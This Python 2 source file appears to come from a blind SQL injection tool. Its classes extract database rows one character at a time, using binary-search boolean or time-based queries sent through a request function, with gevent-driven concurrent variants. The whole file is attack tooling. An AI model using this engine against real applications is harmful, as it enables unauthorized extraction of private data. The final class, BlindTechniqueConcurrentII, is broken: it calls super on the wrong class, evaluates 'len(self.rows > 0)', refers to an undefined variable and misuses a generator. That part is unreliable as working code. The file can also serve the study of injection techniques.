#file: technique.py

from . import debug
from .truth import Truth
from .settings import *
from .exceptions import *

import gevent
from copy import copy

import traceback,sys


class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    @debug.func
    def __init__(self,make_request_func,query,concurrency=1): 
        self.query = query
        self.make_request_func = make_request_func
        self.concurrency = concurrency
        print "technique concurrency: %d" % self.concurrency

        if type(self) == Technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")


class BlindTechnique(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechnique,self).__init__(*args,**kwargs)

    @debug.func
    def run(self,user_query,sleep=None):
        self.sleep = sleep

        user_query = user_query
    
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:            
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    @debug.func
    def _get_next_row(self,row_index,user_query):
        '''finding a row'''
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
                print "\t\t\t%s" % row
            char = self._get_next_char(char_index,row_index,user_query)

            char_index += 1
        if row != "":
            return row
        else:
            return False

    @debug.func
    def _get_next_char(self,char_index,row_index,user_query):
        '''finding a character'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)/2
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                print "data[%d][%d] < %s (%d)" % (row_index,char_index,CHARSET[mid],mid)
                high = mid
            elif self._is_less(row_index, char_index, CHARSET[mid],user_query):
                print "data[%d][%d] > %s (%d)" % (row_index,char_index,CHARSET[mid],mid)
                low = mid + 1
            elif low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
                print "data[%d][%d] = %s (%d)" % (row_index,char_index,CHARSET[mid],ord(CHARSET[mid]))
                return CHARSET[mid]
            else:
                return False
    
    @debug.func
    def _is_greater(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_less(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_equal(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))


class Character:
    def __init__(self,row_index,char_index,query,user_query,make_request_func,truth,sleep):
        self.row_index = row_index
        self.char_index = char_index
        self.query = query
        self.user_query = user_query
        self.make_request_func = make_request_func
        self.truth = truth
        self.sleep = sleep

        self.char_val = CHARSET[len(CHARSET)//2]

        self.done       = False
        self.error      = False

    @debug.func
    def go(self):
        '''keep trying to figure out this character's value. each time this method is called a request will be sent'''
        try:
            low = 0
            high = CHARSET_LEN        
            while low < high:
                mid = (low+high)//2
                self.char_val = CHARSET[mid]
                if self._is_greater(CHARSET[mid]):
                    print "data[%d][%d] < %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],mid)
                    high = mid
                elif self._is_less(CHARSET[mid]):
                    print "data[%d][%d] > %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],mid)
                    low = mid + 1
                elif low < CHARSET_LEN and self._is_equal(CHARSET[mid]):
                    print "data[%d][%d] = %s (%d)" % (self.row_index,self.char_index,CHARSET[mid],ord(CHARSET[mid]))
                    self.done = True
                    return True
                else:
                    self.error = True
                    return False
        except gevent.GreenletExit:
            # if the row is 10 chars long and we are on 15, this will get killed when the end is found...
            pass

    @debug.func
    def _is_greater(self,char_val):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','<')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_less(self,char_val):
        '''
        Returns true if the specified character in the specified row is les
        than char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    @debug.func
    def _is_equal(self,char_val):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',self.user_query)
        query.set_option('row_index',str(self.row_index))
        query.set_option('char_index',str(self.char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()

        return self.truth.test(self.make_request_func(query_string))

    def __repr__(self):
        '''return a character if we have finished without errors'''
        return ['',self.char_val][self.done and (not self.error)]

    def __str__(self):
        '''return a character if we have finished without errors'''
        return ['',self.char_val][self.done and (not self.error)]

    def __eq__(self,y):
        '''return faled if we failed, working if we are still working, and a character if we have finished'''
        if self.error:
            return y=="failed"
        elif not self.done:
            return y=="working"
        else:
            return y==self.char_val
    
    def __ne__(self,y):
        return not self.__eq__(y)

class BlindTechniqueConcurrent(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechniqueConcurrent,self).__init__(*args,**kwargs)

    def __character_generator__(self,row_index=0,char_index=1):
        while True:
            yield Character(\
                row_index           = row_index,\
                char_index          = char_index,\
                query               = self.query,\
                user_query          = self.user_query,\
                make_request_func   = self.make_request_func,\
                truth               = self.truth,\
                sleep               = self.sleep)
            char_index += 1
    
    def __get_row__(self,row_index):
        row = []
        greenlet_row = []

        size = self.concurrency
        chargen = self.__character_generator__(row_index=row_index)

        while "failed" not in row:
            chars_needed = (size - row.count("working"))

            for x in xrange(chars_needed):
                c = chargen.next()
                greenlet_row.append(gevent.spawn(c.go))
                greenlet_row[-1].run()
                row.append(c)

        failed = row.index("failed")
        gevent.killall(greenlet_row[failed:])
        gevent.joinall(greenlet_row[:failed])
                
        rval = ''.join([str(elt) for elt in row[:failed]])
        print "\t\t\t%s" % rval
        return rval
        

    @debug.func
    def run(self,user_query,sleep=None):
        self.user_query = user_query
        self.sleep = sleep

        row_index = 0
        results = []
        row = True
        while row != "":
            if row != True: results.append(row)
            row = self.__get_row__(row_index)
            row_index += 1
        
        return results



class BlindTechniqueConcurrentII(Technique):
    def __init__(self,truth = Truth(), *args, **kwargs):
        self.truth = truth
        super(BlindTechniqueConcurrent,self).__init__(*args,**kwargs)
    
    def __character_getter__(self):
        try:
            while not self.__done__():
                current_index = self.__another_character__()
                if not self.rows[-1][current_index].go():
                    return False

        except gevent.GreenletExit:
            return True

    def __another_character__(self):
        while True:
            c = Character(\
                row_index           = len(self.rows)-1,\
                char_index          = 1,\
                query               = self.query,\
                user_query          = self.user_query,\
                make_request_func   = self.make_request_func,\
                truth               = self.truth,\
                sleep               = self.sleep)
            self.rows[-1].append(c)
            yield len(self.rows[-1]) - 1
            char_index += 1        

    def run(self):
        self.rows = []
        #until we get an empty row
        while len(self.rows > 0) and len(rows[-1]) > 0:
            self.rows.append([])
            #meta row describing which greenlets are working on what characters
            self.greenlet_row = {}

            glets = []
            for i in xrange(self.concurrency):
                glets.append(gevent.spawn(self.__character_getter__))
            gevent.joinall(glets)
            self.rows[-1] = ''.join(self.rows[-1])